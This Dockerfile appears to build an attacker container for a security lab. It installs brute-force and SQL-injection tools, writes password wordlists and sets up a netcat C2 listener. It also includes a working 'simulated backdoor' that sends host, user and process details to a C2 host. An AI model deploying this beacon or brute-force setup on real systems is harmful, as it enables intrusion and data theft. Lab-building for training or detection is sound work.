FROM ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y --no-install-recommends \
    # Core utilities
    bash \
    curl \
    wget \
    iproute2 \
    net-tools \
    netcat-openbsd \
    procps \
    # Reconnaissance tools (Vector 1, 2, 3)
    nmap \
    dnsutils \
    whois \
    # SSH tools (Vector 2: Brute Force)
    openssh-client \
    sshpass \
    hydra \
    # Web exploitation (Vector 1: SQL Injection)
    sqlmap \
    # DNS tools (Vector 3: DNS Poisoning)
    dnsmasq \
    # File transfer & exfiltration
    python3 \
    python3-pip \
    xxd \
    # Compilation tools (for malware sim)
    gcc \
    make \
    && rm -rf /var/lib/apt/lists/*

# Install Python tools for attack scripting
RUN pip3 install --no-cache-dir requests

# Generate SSH keypair for key injection attacks (T1098)
RUN ssh-keygen -t rsa -b 2048 -N "" -f /root/.ssh/id_rsa 2>/dev/null || true

# Create wordlist for brute force (T1110)
RUN mkdir -p /opt/wordlists && \
    echo -e "root\nadmin\nwww-data\nvictim\noperator\nbackup\nguest\ntest\nuser\nubuntu" > /opt/wordlists/users.txt && \
    echo -e "password\npassword123\nadmin123\nroot\ntoor\nwww-data\nvictim\noperator\nbackup\nguest\n123456\nletmein\nqwerty\nabc123\npassword1\nadmin\ndefault\ntest123\nchangeme\nsecret" > /opt/wordlists/passwords.txt

# Copy attack scripts
COPY attacks/ /opt/attacks/
RUN chmod +x /opt/attacks/*.sh 2>/dev/null || true

# Copy exfil receiver
COPY exfil_receiver.py /opt/exfil_receiver.py

# Create malware simulation directory
RUN mkdir -p /opt/malware-sim

# Create simulated C2 listener script
RUN echo '#!/bin/bash' > /opt/malware-sim/c2_listener.sh && \
    echo '# Simulated C2 listener — receives beacons and exfiltrated data' >> /opt/malware-sim/c2_listener.sh && \
    echo 'echo "[C2] Starting C2 listener on port 8443..."' >> /opt/malware-sim/c2_listener.sh && \
    echo 'mkdir -p /tmp/exfil_data' >> /opt/malware-sim/c2_listener.sh && \
    echo 'while true; do' >> /opt/malware-sim/c2_listener.sh && \
    echo '  nc -l -p 8443 > /tmp/exfil_data/$(date +%s).dat 2>/dev/null' >> /opt/malware-sim/c2_listener.sh && \
    echo '  echo "[C2] Received data at $(date)"' >> /opt/malware-sim/c2_listener.sh && \
    echo 'done' >> /opt/malware-sim/c2_listener.sh && \
    chmod +x /opt/malware-sim/c2_listener.sh

# Create simulated backdoor binary (bash script disguised)
RUN echo '#!/bin/bash' > /opt/malware-sim/backdoor.sh && \
    echo '# Simulated backdoor — beacons to C2 server' >> /opt/malware-sim/backdoor.sh && \
    echo 'C2_SERVER="${C2_SERVER:-attacker}"' >> /opt/malware-sim/backdoor.sh && \
    echo 'C2_PORT="${C2_PORT:-8443}"' >> /opt/malware-sim/backdoor.sh && \
    echo 'INTERVAL="${INTERVAL:-30}"' >> /opt/malware-sim/backdoor.sh && \
    echo 'while true; do' >> /opt/malware-sim/backdoor.sh && \
    echo '  DATA=$(hostname; whoami; id; uname -a; ps aux; netstat -tlnp 2>/dev/null)' >> /opt/malware-sim/backdoor.sh && \
    echo '  echo "$DATA" | nc -w 3 $C2_SERVER $C2_PORT 2>/dev/null || true' >> /opt/malware-sim/backdoor.sh && \
    echo '  sleep $INTERVAL' >> /opt/malware-sim/backdoor.sh && \
    echo 'done' >> /opt/malware-sim/backdoor.sh && \
    chmod +x /opt/malware-sim/backdoor.sh

CMD ["bash", "-c", "python3 /opt/exfil_receiver.py & tail -f /dev/null"]
